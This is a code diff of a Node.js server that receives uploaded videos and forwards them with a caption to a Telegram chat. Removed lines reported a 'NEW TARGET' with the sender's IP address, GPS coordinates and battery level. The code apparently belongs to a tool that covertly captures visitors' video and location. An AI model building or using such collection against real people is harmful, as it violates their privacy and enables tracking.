@@ -11,23 +11,12 @@ const PORT = 3000;
 const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
 const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
-// Build clean Telegram text markdown
+// Build clean Telegram text markdown with only necessary device info
 function buildCaption(info) {
-    const mapLink = info.latitude && info.longitude
-        ? `https://www.google.com/maps?q=${info.latitude},${info.longitude}`
-        : "Location not available";
-
-    return `🎬 *NEW TARGET REPORTED*
-
-🌐 *IP Address:* \`${info.ip || "Unknown"}\`
-
-📍 *Location Coordinates:*
-${mapLink}
+    return `🎬 *NEW SESSION RECORDED*
 
 💻 *Device UserAgent:*
-\`${info.userAgent || "Unknown"}\`
-
-🔋 *Battery Level:* \`${info.battery || "Unknown"}\``;
+\`${info.userAgent || "Unknown"}\``;
 }
 
 // Upload endpoint
@@ -38,15 +27,9 @@ app.post("/upload-video", upload.single("video"), async (req, res) => {
             return res.status(400).json({ error: "No video file provided" });
         }
 
-        const { ip, latitude, longitude, userAgent, battery } = req.body;
+        const { userAgent } = req.body;
 
-        const captionText = buildCaption({
-            ip,
-            latitude,
-            longitude,
-            userAgent,
-            battery
-        });
+        const captionText = buildCaption({ userAgent });
 
         // Initialize multi-part form data for Telegram API
         const form = new FormData();
